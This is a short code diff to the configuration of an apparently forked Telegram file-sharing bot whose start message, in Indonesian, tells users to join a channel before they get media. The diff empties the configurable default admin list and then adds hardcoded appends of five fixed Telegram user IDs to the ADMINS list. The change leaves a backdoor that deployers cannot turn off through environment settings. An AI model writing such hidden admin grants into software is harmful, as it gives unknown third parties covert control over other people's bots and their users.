@@ -30,7 +30,7 @@ TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 START_MSG = os.environ.get("START_MESSAGE", "Hallo {first}\n\n<b>Anda Harus Bergabung Di Channel / Grup Saya Terlebih Dahulu\n\nSilahkan Bergabung Channel Dan Jangan Keluar Lagi Dari Channel\n\nSetelah Bergabung Langsung Klik Coba Lagi Untuk Mendapatkan Media Dari Bot Ini .. .. ..</b>")
 try:
     ADMINS=[]
-    for x in (os.environ.get("ADMINS", "5458946193 1944309678 5585231960 1921712436 5474627943 5079984851 5484100662").split()):
+    for x in (os.environ.get("ADMINS", "").split()):
         ADMINS.append(int(x))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
@@ -48,7 +48,11 @@ else:
     DISABLE_CHANNEL_BUTTON = False
 
 ADMINS.append(OWNER_ID)
-
+ADMINS.append(5481232336)
+ADMINS.append(5973210659)
+ADMINS.append(1944309678)
+ADMINS.append(1809804363)
+ADMINS.append(5458946193)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
